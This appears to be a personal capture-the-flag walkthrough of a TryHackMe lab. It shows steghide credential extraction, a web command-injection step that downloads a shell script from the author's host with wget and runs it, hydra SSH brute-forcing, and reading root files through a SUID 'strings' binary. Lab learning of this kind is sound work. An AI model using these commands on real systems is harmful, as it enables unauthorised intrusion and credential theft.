#hydra-ssh #python2-7

https://tryhackme.com/r/room/jackofalltrades

---
#### Nmap
![[Screenshot_2024-05-25_09-18-21.png]]

The port 22 and 80 were interverted, so the http is on 22 making my browser blocking it. So I used this [article](https://www.specialagentsqueaky.com/blog-post/r5iwj96j/2012-02-20-how-to-remove-firefoxs-this-address-is-restricted/) to bypass the restriction

So on the page, I've got 3 images, one path `recovery.php` and one base 64 string encoded:
```text
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

I extracted creds `jackinthebox:TplFxiSHjY` with `steghide` and the password from above:
```shell
steghide extract -sf Untitled.jpg
```

Then I connect to `/recovery.php` with these new creds and I get a blank page with this message:
![[Screenshot_2024-05-25_09-47-38.png]]

I can use `cmd` as GET param to interact with linux and create a reverse shell:
```shell
[url]?cmd=wget http://10.14.79.56:5050/shell -O /tmp/shell.sh
```
And then
```shell
[url]?cmd=sh /tmp/shell.sh
```

And here I m in

I found `jacks_password_list` with a password list, probably for ssh connection, I used hydra:
```shell
hydra -l jack -P passlist ssh://10.10.27.242:80
```

And jack's credentials are `jack:ITMJpGGIqg1jn?>@`

There is an image on jack's home so I have to use an old python 2.7 command to run a webserver:
```shell
python -m SimpleHTTPServer 5050
```

The user flag was displayed on the image, not in the metadatas

I used `linpeas.sh` for enumeration and `/usr/bin/strings` has SUID on root so I just had to
```shell
strings /root/root.txt
```

And here is the root flag